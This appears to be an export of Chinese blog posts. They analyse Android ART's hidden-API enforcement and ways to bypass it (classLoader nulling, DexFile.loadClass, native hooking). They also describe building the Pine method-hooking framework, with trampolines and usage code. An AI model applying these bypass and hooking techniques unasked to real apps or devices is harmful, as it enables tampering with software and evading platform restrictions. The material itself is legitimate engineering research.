Domain::kPlatform: &#123; DCHECK(callee_context.GetDomain() == Domain::kCorePlatform); // 如果是需要暴露出来的Core Platform API，通过 if ((runtime_flags &amp; kAccCorePlatformApi) != 0) &#123; return false; &#125; // 完全关闭访问限制，通过 // Android Q中默认是关闭，R中不知道 EnforcementPolicy policy = Runtime::Current()-&gt;GetCorePlatformApiEnforcementPolicy(); if (policy == EnforcementPolicy::kDisabled) &#123; return false; &#125; return detail::HandleCorePlatformApiViolation(member, caller_context, access_method, policy);&#125;Q中默认是关闭这个功能，R中不知道；这部分简单了解一下就好，主要还是关注kApplication即应用代码访问系统API的情况。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950template&lt;typename T&gt;bool ShouldDenyAccessToMemberImpl(T* member, ApiList api_list, AccessMethod access_method) &#123; Runtime* runtime = Runtime::Current(); EnforcementPolicy hiddenApiPolicy = runtime-&gt;GetHiddenApiEnforcementPolicy(); MemberSignature member_signature(member); // ART内部存在一个豁免名单，如果匹配，那么通过 if (member_signature.DoesPrefixMatchAny(runtime-&gt;GetHiddenApiExemptions())) &#123; MaybeUpdateAccessFlags(runtime, member, kAccPublicApi); return false; &#125; bool deny_access = false; EnforcementPolicy testApiPolicy = runtime-&gt;GetTestApiEnforcementPolicy(); // 如果hiddenApiPolicy == EnforcementPolicy::kJustWarn，那么不作处理（EnforcementPolicy只有三种状态） if (hiddenApiPolicy == EnforcementPolicy::kEnabled) &#123; if (testApiPolicy == EnforcementPolicy::kDisabled &amp;&amp; api_list.IsTestApi()) &#123; // ART内部对测试API（即有@TestApi注解的API）的特别处理 deny_access = false; &#125; else &#123; // 比较SdkVersion，决定是否需要拒绝访问 // 所谓的 灰名单/黑名单 便在此实现 switch (api_list.GetMaxAllowedSdkVersion()) &#123; case SdkVersion::kP: deny_access = runtime-&gt;isChangeEnabled(kHideMaxtargetsdkPHiddenApis); break; case SdkVersion::kQ: deny_access = runtime-&gt;isChangeEnabled(kHideMaxtargetsdkQHiddenApis); break; default: deny_access = IsSdkVersionSetAndMoreThan(runtime-&gt;GetTargetSdkVersion(), api_list.GetMaxAllowedSdkVersion()); &#125; &#125; &#125; if (access_method != AccessMethod::kNone) &#123; // 省略代码：发出关于访问隐藏API的警告 // If this access was not denied, move the member into whitelist and skip // the warning the next time the member is accessed. if (!deny_access) &#123; MaybeUpdateAccessFlags(runtime, member, kAccPublicApi); &#125; &#125; return deny_access;&#125;OK，大致流程都已经清晰，梳理一下：如果目标成员是公开API，直接通过获取调用者的AccessContext，如果可信那么通过如果访问检查被完全关闭，那么通过判断目标成员是否在豁免名单里，如果在那么通过hiddenApiPolicy == EnforcementPolicy::kJustWarn，不会对deny_access赋值，警告后通过以上条件都不满足，根据targetSdkVersion决定是否需要拒绝访问下有对策把系统的策略搞清楚了，接下来绕过就容易了。我们一步一步来：首先如果这个member的access flags里有kAccPublicApi，那么系统就认为这是一个公开API，就不会进行任何限制了，然而我们如果要对access_flags动手脚，必须先拿到这个member，然而系统就是限制了我们去拿这个member的过程，死循环了，放弃；然后，如果调用者是可信的，那么也会通过，有这些情况：调用者所在的类在系统路径下调用者所在的类对应的类加载器（ClassLoader）为null（即被BootClassLoader加载的类）debug版并且主动设置了跳过限制，对应接口为VMDebug.allowHiddenApiReflectionFrom(Class&lt;?&gt; klass)我们有两种方法，一种是直接把自己的类变成系统类，另一种是通过系统API发起调用；第二种对应的实现方案就是套娃反射，然而现在已经被谷歌封掉了，我也找不到其他API，就只剩下把自己的类变成系统类了。首先排除只能在debug mode工作的3；而1也没法满足，主动修改dex_file-&gt;hiddenapi_domain_需要先拿到这个dex_file指针，而不使用ART内部接口的情况下是不方便拿到的，而且修改hiddenapi_domain_需要提前知道这个成员变量对应的偏移，先放弃；2我觉得是这三种方法里最好的，Class对象直接在java层就能拿到，改也可以直接在java层改，类似这样：123Field classLoaderField = Class.class.getDeclaredField(\"classLoader\");classLoaderField.setAccessible(true);classLoaderField.set(MyClass.class, null);然后就可以用这个MyClass进行反射。问题在于这个classLoader变量也是隐藏API，当然你也可以用Unsafe等方案，但终究不保险；我们最好使用公开API，那有这样的公开API吗？有！dalvik.system.DexFile中有这样一个方法：1public Class loadClass (String name, ClassLoader loader)第二个参数就是指定该Class的ClassLoader，设置成null即可。但使用这个方法，你需要自己额外准备一个dex文件，加载获得DexFile对象后再调用loadClass，略显繁琐，实际使用的话可以弄个gradle脚本，拦截mergeDexDebug/Release拿到dex；另一个问题是DexFile是Deprecated，虽然现在用没问题，但保不准哪天就被谷歌给删了。提到这个方法，有的小伙伴可能会想起来，我们的目标是获得一个行为受我们控制且class_loader==null的类，java.lang.reflect.Proxy中也有类似的接口，那么我们可以用动态代理吗？事实证明是不行的，你确实可以获得一个class_loader==null的代理类，然而动态代理只是一个桥梁，最后执行动作是用的InvocationHandler对象，最终栈回溯的结果取决于这个InvocationHandler对应的Class。（注：这就是我当时提出的另一个绕过方法，当时在我自己的贴吧里发了个贴，之后被百度删了，申诉四次没过，呵呵）似乎从这里入手不太好的样子，我们继续。第三步和第五步中，都需要通过runtime-&gt;GetHiddenApiEnforcementPolicy()的返回值做判断，查看实现可以看见其实就是返回了一个成员变量hidden_api_policy_，那我们改这个成员变量不就行了？然而打开runtime.h你就会发现这个对象太大了，什么东西都往里面扔，改里面的值存在一定风险；搜索一下你会发现art通过RAII机制封装了一个ScopedHiddenApiEnforcementPolicySetting出来，然而这个类的构造函数并没有导出，我们无法直接调用，先放着。第四步中提到art内部有一个豁免名单，而这个名单同样保存在runtime中，和上面的情况一样；不过这个API暴露到了java层，java层中有对应的接口（VMRuntime.setHiddenApiExemptions(String[] exemptions)），不过这个接口在黑名单内，也无法直接调用。OK，研究完了，得出结论：没有较为方便通用稳定的方法……才怪。我们的最终目标是成功拿到member，反映到代码里就是ShouldDenyAccessToMember返回false，为此我们可以通过各种方式干扰这个函数的执行，但最终都还是为了让它返回false。既然我们只是为了这个，那么其实可以用更直观的方式：native hook。查看art代码可以发现无论是P上的ShouldBlockAccessToMember还是Q上的ShouldDenyAccessToMember，执行流程中都会调用某个关键的且符号已被导出的函数，P上是GetMemberActionImpl，Q上是ShouldDenyAccessToMemberImpl，直接hook住，修改它的返回值就ok了，目前Pine采用了这种方式，具体实现可见这个commit。总结嗯，大概就是这样啦~又放一下咱的QQ群：949888394~感谢你能看到最后~","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"hidden-api","slug":"hidden-api","permalink":"https://blog.canyie.top/tags/hidden-api/"}]},{"title":"ART上的动态Java方法hook框架","slug":"dynamic-hooking-framework-on-art","date":"2020-04-27T02:00:00.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2020/04/27/dynamic-hooking-framework-on-art/","link":"","permalink":"https://blog.canyie.top/2020/04/27/dynamic-hooking-framework-on-art/","excerpt":"大家应该还记得我上次介绍的Dreamland吧，忘记了也没事，简单介绍一下：这是一个类似Xposed的框架，可以注入应用进程并进行方法hook。进程注入上次已经说过了，另一个重点hook当时是使用了SandHook框架，这是一款非常优秀的hook框架，但是有点问题，不太适合Dreamland；在比较了其他hook框架之后，发现似乎都存在一些问题，最终决定自己动手写一个。已经开源，代码在这：Pine，接下来我会介绍它的具体实现。","text":"大家应该还记得我上次介绍的Dreamland吧，忘记了也没事，简单介绍一下：这是一个类似Xposed的框架，可以注入应用进程并进行方法hook。进程注入上次已经说过了，另一个重点hook当时是使用了SandHook框架，这是一款非常优秀的hook框架，但是有点问题，不太适合Dreamland；在比较了其他hook框架之后，发现似乎都存在一些问题，最终决定自己动手写一个。已经开源，代码在这：Pine，接下来我会介绍它的具体实现。其他框架的一些问题注：这里并没有贬低其他框架的意思，只是单纯的比较现在是2020年，ART Hook框架已经非常多，但是肯定不是随便拿一个就能用的；我们需要一个能提供Xposed-style hook接口的框架，Xposed的hook接口只要求提供一个callback，是完全动态的，而像YAHFA这样的框架则要求提供一个与目标方法参数与返回值都相同的方法，如果需要调用原方法还需要提供一个backup方法，无法直接做到像Xposed那样的风格的hook。这样一过滤，剩下的框架就不多了，挑出了几个框架：Whale，原理是设置目标方法为native，然后用libffi动态生成一个处理函数，设置entry_point_from_jni为这个处理函数。这个框架可以直接像Xposed那样hook，不过实测不太稳定，比如在bridge里随便抛个异常（即使被try-catch住）就会导致Runtime直接abort。Frida/AndHook似乎也是一样的套路，应该也会有这个问题。SandHook，这个框架对Xposed兼容自带有两种方案：一是用DexMaker动态生成bridge函数，没有什么兼容性问题，但是第一次加载的时候会很慢；二是用动态代理生成bridge方法，这个bridge方法用像whale一样的方案：设置native，libffi动态生成native处理函数，设置entry_point_from_jni。这个方案用起来很快，但是存在挺多坑，稳定性存疑。FastHook，根据调用约定在栈里捞参数，作者宣称它“高效稳定、简洁易用”，然而试了下，并不稳定，而且提供的hook接口很难用（一个通用接口有7个参数），而且作者现在似乎不维护了，emmmEpic，根据调用约定从寄存器和栈里解析参数，VirtualXposed和太极都在用，经过大量验证非常稳定，不过现在闭源了，开源版有一些bug经过对比，发现大多数hook框架都不太符合要求，Epic现在闭源，最终决定自己动手写一个。注：这里只是根据我的需求评估的，如果你可以提供与原方法参数和返回值都相同的hook方法与backup方法，或者对稳定性有较高要求而速度是其次的话，那么更建议使用成熟的SandHook框架。基础知识在介绍Pine之前，先介绍一下基础知识。一个方法/构造器在art中表示为一个ArtMethod对象，ArtMethod保存着该方法的信息等。以Android 9.0的源码为例，一个ArtMethod是这样的：1234567891011121314151617class ArtMethod FINAL &#123; /** 该方法的所属类 */ GcRoot&lt;mirror::Class&gt; declaring_class_; /** 方法的访问标志，比如public，private就存储在这里 */ std::atomic&lt;std::uint32_t&gt; access_flags_; // 省略一些成员 struct PtrSizedFields &#123; /** 公共存储区域，Native方法为对应的native函数，非native方法则是其他东西（比如jit要用的ProfilingInfo） */ void* data_; /** 方法入口，如果已被编译则为编译后的代码入口，未编译则为解释器入口 */ void* entry_point_from_quick_compiled_code_; &#125;&#125;略去一些细节，ART的函数调用过程其实很简单：caller想办法拿到callee的ArtMethod对象将参数按照约定存到寄存器和栈里跳转到callee的方法入口基本实现Pine支持两种方案，一种是替换入口，即修改ArtMethod的entrypoint；另一种类似于native的inline hook，即覆盖掉目标方法的代码开始处的一段代码，用于弥补Android 8.0以下版本入口替换很有可能不生效的问题。入口替换我们看看上面的ArtMethod，发现了一个很重要的成员：entry_point_from_quick_compiled_code_，这个变量保存至该方法的代码入口，如果我们直接修改这个变量，不就可以达到hook的目的了吗？然而事情并没有这么简单。用入口替换方案去hook自己的方法，大部分情况下是没有问题的；但如果你需要hook系统的方法，并且这个方法不是virtual方法（比如TextView.setText(CharSequence)），那么很有可能不生效。这是因为，Android 8.0以下，art有一个Sharpening优化，如果art能够确定callee的代码入口，那么有可能直接把入口硬编码在机器码内，根本不会去ArtMethod里取入口。还有没有其他方法呢？当然有，那就是inline hook。inline hook从上面的分析可以看出，目标方法的代码是一定会用到的；那么我们可以直接修改目标方法的代码，把前几条代码修改为一段跳转指令，这样当这个方法执行时，就会直接跳到我们指定的另一段代码处执行，我们就达到了hook目的。以下情况不能被inline hook：jni方法和代理方法。jni方法和代理方法都没有对应的已编译代码，其entry_point_from_quick_compiled_code_固定指向一段trampoline，这个trampoline会跳转到真正的代码处执行。方法未被编译且尝试编译失败。方法已被编译，但代码太短以至于一个简单的跳转指令都放不下。跳转指令arm32需要8字节，arm64需要16字节；实际上我们可以考虑其他方式跳转，比如如果我们可以偷到目标代码附近的内存，就能直接使用b指令跳转（此方法来自于Dobby框架）；或者我们可以放一个非法指令，程序执行到这条指令时会产生一个SIGILL信号，我们捕获到这个信号，对寄存器和栈进行操作就能直接控制执行流程（注：此方法来自于卓桐大佬的Android elf hook的方式）。之所以不做这个处理，是因为这样的方法很少，而且很可能被直接内联到caller里，个人认为没必要。方法的前几条代码里有pc寄存器相关指令，hook时没问题，但执行原方法时会有问题（具体见后面的 一些问题-执行原方法 部分）当出现以上情况时，自动转用入口替换模式。四个跳板我们需要写四段模板代码，注意要用纯汇编写以避免破坏栈和寄存器，暂时命名为trampoline：DirectJumpTrampoline：inline hook使用，功能是跳转至一个绝对地址，需要插入目标方法的代码开始处。BridgeJumpTrampoline：两个方案都需要使用，处理一些东西并跳转至Bridge方法，这个bridge是我们预先写好的一个java方法，跳转到这个方法之后我们就回到了java世界，然后就可以开始处理真实的AOP逻辑。CallOriginTrampoline：入口替换使用，功能是设置r0寄存器为原方法并跳转至原方法入口。将成为backup方法的入口。（暂未使用，目前发现设置r0寄存器为原方法后有几率造成卡死）BackupTrampoline：inline hook使用，设置r0寄存器为原方法、存放被覆盖的代码并跳转至(原方法入口+备份代码大小)处继续执行。将成为backup方法的入口。（其实这段代码叫trampoline是不太合适的）一些问题基本原理比较简单，但是实现的过程中会遇到很多的问题，这里简单说一下。参数解析大概想了一下，参数解析有以下方案：动态生成出一个有和原方法相同的参数列表的方法，这个方法只是一个bridge，作用就是传递参数和返回值；需要注意的是，这个方法必须要有对应的代码，和一些必要的成员，为此可以有两种方法：通过如DexMaker等动态字节码生成技术动态生成出这个方法（EdXposed用的方案）；这种方案的主要问题是比较慢，动态生成dex并加载是耗时操作。利用java的动态代理动态生成，难点在于如何控制这个新生成的代理方法做你想要做的事；SandHook的xposedcompat_new里实现了一个：把这个代理方法设置为native方法，然后通过libffi动态生成对应的native函数，然后修改其entry_point_from_jni（其实就是Whale那个方案，不过whale是对目标方法，SandHook的xposedcompat_new是对处理方法），这个方案有点问题，凭空把一个非native方法变为native有很多未知的坑等着你去踩。统一bridge方法，在这个bridge方法里自己解析参数。art为了实现java的动态代理，自己就有一个art_quick_proxy_invoke_handler，如果能利用好这个内置函数，那么就可以达到目的。不过看了下代码，这个函数利用起来很难，暂时先放弃。最终我选择自己解析参数，hook时较快；为此我们需要了解ART的函数调用约定，根据这个约定去解析。以arm32/thumb2为例，在ART中，r0寄存器固定保存callee的ArtMethod*，r1~r3寄存器保存前三个参数（注：非静态方法实际上第一个参数就是this）；同时，sp~sp+12上也传递着r0~r3上的值；多余的参数通过栈传递，比如第四个参数就存在sp+16上；如果一个参数一个寄存器放不下（long/double），那么会占用两个寄存器。不过这只是基本情况，其他情况还需特别处理（如在6.0或以上，如果第一个参数是long/double类型的，那么会跳过r1寄存器等等）。ok，我们发现了一个简单的办法：我们可以修改r1~r3传递其他东西，必须需要的只有sp，因为sp~sp+12上也存放着r0~r3上的值，剩下的参数也通过sp传递，那么我们直接通过sp就能获取到所有参数？兴冲冲的写好代码测试发现，此路不通，通过sp拿到的前几个参数是乱的。为什么？weishu的文章论ART上运行时 Method AOP实现里揭露了答案：虚拟机本身也是知道 sp + 12 这段空间相当于是浪费的，因此他直接把这段空间当做类似寄存器使用了。那怎么办呢？在栈上分配内存来放？同样行不通，这样一旦发生栈回溯，sp被修改的那一帧会因为回溯不到对应的函数引发致命错误，导致runtime abort。现在我采用和epic类似的方法实现：在hook时分配一段内存，这段内存用来放r0~r3，先保存了再跳转到bridge方法，bridge方法就可以取出对应的值。另外对象类型要特别处理，art传递对象时其实传的是这个对象的地址，我们接收到的只是一串数字，转换的方法有两个：直接通过java层的Unsafe，直接put进地址，拿出来的就是对象通过jni，用一个art内部函数把地址转换成jobject，返回到java的时候会自动进行转换这里我选择第二种方法，因为第一种需要用反射调用Unsafe，而反射效率不是很高，有较多参数时效率会比较低。多线程并发上面提到由于没有其他地方放前几个参数，所以在hook时就会提前分配一块地址专门来放，大概这样：1234ldr ip, extra_addrstr r1, [ip, #0]str r2, [ip, #4]str r3, [ip, #8]然后会在bridge里拿到r1~r3。这段代码在单线程下执行并没有问题，但在多线程环境下，如果存值之后还没来得及取值就被其他线程修改，就会读到错误的值，导致错误。修复这个问题的一种方法是禁止多线程并发执行，比如给目标方法加上synchronized的flag，但是这样显然太重了，我们只需要在存值——取值这段时间里禁止并发即可。为此，我通过CAS机制写了一个自旋锁：123456789acquire_lock:ldrex r0, [ip]cmp r0, #0wfene // other thread holding the lock, wait it release lockmov r0, #1strexeq r0, r0, [ip]cmpeq r0, #0 // store succeeded?bne acquire_lock // acquire lock failed, try againdmbextras的第一个变量即为锁标志，为0代表无锁，为1代表已有线程持有该锁，获取时通过CAS去抢锁，bridge里将锁标志置0释放锁。注意需要添加内存屏障以阻止部分关键指令被乱序执行引发错误。这里还有一个问题：arm32/thumb2下，ldrex/strex需要一个寄存器来接收结果，而ip寄存器已存放着extras的地址；arm64下stlxr要求source和status不能相同等等，都需要占用一个额外寄存器，这里我选择r0寄存器，原因很简单：r0寄存器固定保存callee的ArtMethod指针，这个值在hook的时候就已确定；跳转到bridge方法时也会更改为bridge的ArtMethod等。（注：发现arm64有一个xzr/wzr寄存器固定为0，如果把lock_flag改成0为有锁1为无锁就可以直接用wzr寄存器了，可以少用一个寄存器，列入TODO列表里了）（注2：仔细思考了一下，发现如果两个线程抢锁，持有锁的线程获取到锁以后还没来得及释放就因为gc等进入checkpoint被挂起，而另一个线程在等锁无法进入checkpoint，导致类似死锁的情况，最终导致挂起所有线程超时runtime abort，没想到怎么解决，暂时先挂着吧）执行原方法要执行原方法，我们需要一个原方法代码入口。入口替换模式下，直接使用原来那个入口就行；但在inline hook模式下，由于我们修改了方法入口处的代码，需要对原方法代码进行备份，调用原方法的时候直接执行这段备份的代码，然后继续跳转到剩余代码部分执行即可。我们特别写了一段叫做BackupTrampoline的代码实现，以arm32为例：12345678910FUNCTION(pine_backup_trampoline)ldr r0, pine_backup_trampoline_origin_method // 将r0寄存器设置为原方法VAR(pine_backup_trampoline_override_space).long 0 // 会被替换为真实代码.long 0 // 会被替换为真实代码ldr pc, pine_backup_trampoline_remaining_code_entry // 跳转到剩余部分继续执行VAR(pine_backup_trampoline_origin_method).long 0VAR(pine_backup_trampoline_remaining_code_entry).long 0而thumb2需要特别注意，由于在thumb2下一条指令可能是4字节也可能是2字节，如果我们固定为只备份8字节则有可能导致指令被截断（比如4-2-4），所以备份的时候一定要注意指令完整性。123static inline bool IsThumb32(uint16_t inst) &#123; return ((inst &amp; 0xF000) == 0xF000) || ((inst &amp; 0xF800) == 0xE800);&#125;1234567891011FUNCTION(pine_thumb_backup_trampoline)ldr r0, pine_thumb_backup_trampoline_origin_methodVAR(pine_thumb_backup_trampoline_override_space).long 0 // 会被替换为真实代码.long 0 // 会被替换为真实代码nop // 可能会被替换为真实代码，否则只是一条nopldr pc, pine_thumb_backup_trampoline_remaining_code_entry // 跳转到剩余部分继续执行VAR(pine_thumb_backup_trampoline_origin_method).long 0VAR(pine_thumb_backup_trampoline_remaining_code_entry).long 0另一个问题是，在inline hook模式下，我们需要把部分原始指令备份到另一个地方，如果这部分指令里有pc相关指令，由于此时指令地址不同，会发生错误。传统native inline hook框架的做法是做指令修复，而因为art上这种情况很少，所以Pine目前并没有指令修复，只是简单的做判断，如果发现这种情况直接转用入口替换模式。（注：其实还可以有另一种方案，就是不用原来的指令，设置r0寄存器为原方法后直接跳转到art_quick_to_interpreter_bridge走解释执行就行，注意需要清掉对应ProfilingInfo的saved_entry_point_，否则可能会直接跳转到原方法入口执行，就死循环了）好的，现在我们有了原代码入口，我们可以动态创建出一个backup方法，设置backup方法入口为原代码入口，然后直接反射调用这个方法就行了！不过有一点要注意，由于这个方法是动态创建出来的，而ArtMethod的declaring_class是GcRoot，可能被gc移动，art会自动更新原版ArtMethod里的地址，但是不会更新我们自己创建的ArtMethod里的地址，所以需要我们自己主动更新。123456789void Pine_updateDeclaringClass(JNIEnv *env, jclass, jobject javaOrigin, jobject javaBackup) &#123; auto origin = art::ArtMethod::FromReflectedMethod(env, javaOrigin); auto backup = art::ArtMethod::FromReflectedMethod(env, javaBackup); uint32_t declaring_class = origin-&gt;GetDeclaringClass(); if (declaring_class != backup-&gt;GetDeclaringClass()) &#123; LOGI(\"The declaring_class of method has moved by gc, update its reference in backup method now!\"); backup-&gt;SetDeclaringClass(declaring_class); &#125;&#125;不过还有一个问题，假如在我们检查完declaring_class之后调用backup之前发生gc，这个class对象被移动了，怎么办呢？难道要在这段时间里直接关闭Moving GC？太重了，我们只希望declaring_class不会被移动就行。实际上，确实有让一个对象暂时不会被移动的方法：对于在栈上有引用的对象，不会被gc移动。那就简单了，保证对应的Class对象在栈上有引用即可，需要注意必须显式使用一下，否则会被优化：（此方法来源于SandHook，未验证，在Android 10上测试并不能阻止对象被移动，哎）（注：这里之前是考虑过用FastHook的那种方案的，即动态代理创建出forward方法，只修改forward的entry而非全部备份，不过试下来发现有点问题）ok，调用原方法完成。jit这是官方文档上的JIT工作流程图。Pine对jit的处理和其他框架差不多：如果目标方法没被编译，先尝试调用jit_compile_method进行编译，编译的结果直接影响到走inline hook还是入口替换；jit编译会改变线程状态，有可能会造成crash，所以编译完后需要恢复线程状态；给原方法和backup方法添加kAccCompileDontBother防止其被jit编译从而引发错误；另外还照着SandHook写了一个禁用jit inline。不过这似乎还远远不够。FastHook作者在这篇文章中提到了这两点：如果该方法正在jit编译，那么我们手动编译是不安全的。jit gc会修改方法入口为解释器入口，当方法进入解释器时会重新设置为原来的入口并跳转到原来的入口执行。另外我简单看了下jit源码，发现包括ProfilingInfo和被编译的代码在内的大部分内容都有可能被回收。暂时还没想好这个怎么处理emmmELF符号解析受限于实现原理，我们需要获得来自系统私有库内的大量私有符号，最简单的办法就是用dlsym，不过在Android N上，Google禁止了这种行为，而且我们还需要获取一些在.symtab表里的符号（比如art_quick_to_interpreter_bridge），这些用dlsym是搜索不到的。因为我对elf格式不熟，所以直接用的SandHook作者的AndroidELF，在这特别表示感谢~各设备兼容处理安卓各版本的变化这些都是老生常谈了，这条要讲的问题是指当厂商修改了一些成员偏移的情况。比如ArtMethod，我们做hook至少需要获得art_entry_point_from_quick_compiled_code_和access_flags_，我们可以根据AOSP写死偏移，但是这样的话一旦厂商做了什么手脚改了偏移，那就完蛋了。而我知道的框架只有SandHook和Whale是动态查找偏移，其他都是根据AOSP写死偏移。实际上我们可以在运行时动态获得这些offset，拿access_flags_来说吧，我们可以定义一个方法，然后根据该方法的属性预测access_flag，然后可以用这个预测的flag在ArtMethod里动态搜索到值（这个方法最好是native的，否则很有可能会被加上一个kAccSkipAccessChecks导致搜索不到）；而对于entry_point_from_quick_compiled_code_，并没有办法预测值，但是我们可以预测在art_entry_point_from_quick_compiled_code_旁边的data_成员的值：对于native方法，这个值是对应的jni函数地址，我们可以搜索到，然后直接加上成员大小就行（需要注意内存对齐）而对于无法动态获得偏移的情况，比如CompilerOptions，它在内存中是这样的：12345678910class CompilerOptions final &#123; CompilerFilter::Filter compiler_filter_; size_t huge_method_threshold_; size_t large_method_threshold_; size_t small_method_threshold_; size_t tiny_method_threshold_; size_t num_dex_methods_threshold_; size_t inline_max_code_units_; // 省略一大堆成员&#125;假如我们要修改它的inline_max_code_units_，没什么能很好获取偏移的办法，那么我们只能根据版本写死偏移，运行时就只能判断对应的值是否在范围内，超过范围不修改（比如获取出一个114514，那肯定不是正常的值，就可以判断出偏移不对）。使用上面说了这么久实现原理，下面让我们来看看这东西怎么用吧~基础使用在bridge.gradle里加入如下依赖：123dependencies &#123; implementation 'top.canyie.pine:core:0.0.1'&#125;配置一些基本信息：12PineConfig.debug = true; // 是否debug，true会输出较详细logPineConfig.debuggable = BuildConfig.DEBUG; // 该应用是否可调试，建议和配置文件中的值保持一致，否则会出现问题然后就可以开始使用了。例子1：监控Activity onCreate（注：仅做测试使用，如果你真的有这个需求更建议使用registerActivityLifecycleCallbacks()等接口）123456789Pine.hook(Activity.class.getDeclaredMethod(\"onCreate\", Bundle.class), new MethodHook() &#123; @Override public void beforeHookedMethod(Pine.CallFrame callFrame) &#123; Log.i(TAG, \"Before \" + callFrame.thisObject + \" onCreate()\"); &#125; @Override public void afterHookedMethod(Pine.CallFrame callFrame) &#123; Log.i(TAG, \"After \" + callFrame.thisObject + \" onCreate()\"); &#125;&#125;);Pine.CallFrame就相当于xposed的MethodHookParams。例子2：拦截所有java线程的创建与销毁：123456789101112131415final MethodHook runHook = new MethodHook() &#123; @Override public void beforeHookedMethod(Pine.CallFrame callFrame) throws Throwable &#123; Log.i(TAG, \"Thread \" + callFrame.thisObject + \" started...\"); &#125; @Override public void afterHookedMethod(Pine.CallFrame callFrame) throws Throwable &#123; Log.i(TAG, \"Thread \" + callFrame.thisObject + \" exit...\"); &#125;&#125;;Pine.hook(Thread.class.getDeclaredMethod(\"start\"), new MethodHook() &#123; @Override public void beforeHookedMethod(Pine.CallFrame callFrame) &#123; Pine.hook(ReflectionHelper.getMethod(callFrame.thisObject.getClass(), \"run\"), runHook); &#125;&#125;);注意如果我们只hook Thread.run()，Thread子类可能会重写Thread.run()方法不调用super.run()那么就无法hook到，所以我们可以hook一定会被调用的Thread.start()方法感知到新线程建立，此时可以获得具体的类，然后直接hook这些运行时才被发现的类就行。我们还可以玩点丧心病狂的，比如：12Method checkThread = Class.forName(\"android.view.ViewRootImpl\").getDeclaredMethod(\"checkThread\");Pine.hook(checkThread, MethodReplacement.DO_NOTHING);这段代码会干什么呢？没错，现在你可以在任何线程随意操作ui了，不用怕ViewRootImpl.CalledFromWrongThreadException了 ^_^当然，Pine的用途远不止这些，这一切都取决于您的想象力~其他一些API这里介绍一些其他的API：Pine.ensureInitialized()：默认情况下Pine是懒初始化的，即第一次调用需要初始化的API时才会进行初始化，你可以调用此方法来主动进行初始化Pine.invokeOriginalMethod(Member method, Object thisObject, Object... args)：调用原方法，不过不建议使用这个接口，更建议使用效率更高的CallFrame.invokeOriginalMethod()。Pine.setHookMode(int hookMode)：设置Pine的hook方案，取值：Pine.HookMode.AUTO：由Pine自行决定；Pine.HookMode.INLINE：inline hook优先；Pine.HookMode.REPLACEMENT：入口替换优先。注：设置hook方案并不代表Pine一定会以该方案进行hook，如hook jni函数就只能进行入口替换。Pine.disableJitInline()：尝试关闭JIT的内联优化。Pine.compile(Member method)：主动调用JIT尝试编译一个方法。Pine.decompile(Member method, boolean disableJit)：使某个方法转换为解释执行。参数disableJit表示是否需要阻止该方法再次被JIT编译。还有其他一些不太常用的就不再介绍了，感兴趣的可以去看看源码。使用须知Pine的开源协议是反996协议。Pine支持Android 4.4（只支持ART）~10.0，aarch32（未测试，几乎见不到，以后可能会移除）/thumb2/arm64架构；6.0 32bit下参数解析可能会有问题，没有对应测试机无法测试（其实是看epic源码有对M进行特殊处理，不过这段没看懂emm）；另外，Pine没有自带绕过隐藏API限制策略的方法，如果你需要在9.0及以上使用，那么请自行处理（比如使用FreeReflection）；R上简单看了下，jmethodID有可能不是真实的ArtMethod*了，不过java层Executable的artMethod变量似乎还是，处理了这点应该就行Pine只在少数的几台设备上做过测试，稳定性暂无法保证，不建议在生产环境中使用。大部分java方法都可被Pine hook，但是这些方法除外：类的静态初始化块部分关键系统方法被Pine内部使用了的方法（hook会导致死循环）有无法被inline hook的情况被完全内联的方法（如果能知道caller，那么可以decompile caller）总结嗯，大概就是这样啦~再放一下开源地址：Pine几个对我帮助比较大的项目：SandHookEpicAndroidELF：本项目使用了的ELF符号搜索库YAHFAFastHook在这再次表示感谢~如果你对本项目感兴趣的话，可以拿出你的手机帮我测试一下，欢迎提issue和PR，也可以加一下QQ群：949888394一起讨论，^_^","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"},{"name":"AOP","slug":"AOP","permalink":"https://blog.canyie.top/tags/AOP/"},{"name":"hook","slug":"hook","permalink":"https://blog.canyie.top/tags/hook/"}]},{"title":"一种在ART上快速加载dex的方法","slug":"fast-load-dex-on-art-runtime","date":"2020-02-15T02:02:33.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2020/02/15/fast-load-dex-on-art-runtime/","link":"","permalink":"https://blog.canyie.top/2020/02/15/fast-load-dex-on-art-runtime/","excerpt":"在国内的大环境下，Android上插件化/热修复等技术百花齐放，而这一切都基于代码的动态加载。Android提供了一个DexClassLoader。用这个API能成功加载dex，但有一个比较严重的问题：Android Q以下，当这个dex被加载时，如果没有已经生成的oat，则会执行一次dex2oat把这个dex编译为oat，导致第一次加载dex会非常非常慢。个人认为这样的设计是非常不合理的，虽然转换成oat之后执行会很快，但完全可以让用户以解释器模式先愉快的用着，dex2oat放另一个线程执行多好。Android 8.0上谷歌还提供了一个InMemoryDexClassLoader，而以前的Android版本，就要开发者自己想办法了……","text":"在国内的大环境下，Android上插件化/热修复等技术百花齐放，而这一切都基于代码的动态加载。Android提供了一个DexClassLoader。用这个API能成功加载dex，但有一个比较严重的问题：Android Q以下，当这个dex被加载时，如果没有已经生成的oat，则会执行一次dex2oat把这个dex编译为oat，导致第一次加载dex会非常非常慢。个人认为这样的设计是非常不合理的，虽然转换成oat之后执行会很快，但完全可以让用户以解释器模式先愉快的用着，dex2oat放另一个线程执行多好。Android 8.0上谷歌还提供了一个InMemoryDexClassLoader，而以前的Android版本，就要开发者自己想办法了……源码分析注：为了说明此方法能在较低版本的ART上运行，本文分析的源码是Android 5.0的源码，之后的Android版本里OpenDexFileFromOat方法搬到了OatFileManager里，而调用dex2oat的部分则重构到了OatFileAssistant中，大致逻辑相同，感兴趣的可以自己去看看；至于Android 4.4，简单扫了一下源码似乎是生成oat失败就会直接抛一个IOException拒绝加载，emmm……我们在Java代码里用new DexClassLoader()的方式加载dex，最后会调用到DexFile.openDexFileNative中，这个函数的实现是这样的：12345678910111213141516171819202122232425static jlong DexFile_openDexFileNative(JNIEnv* env, jclass, jstring javaSourceName, jstring javaOutputName, jint) &#123; ScopedUtfChars sourceName(env, javaSourceName); if 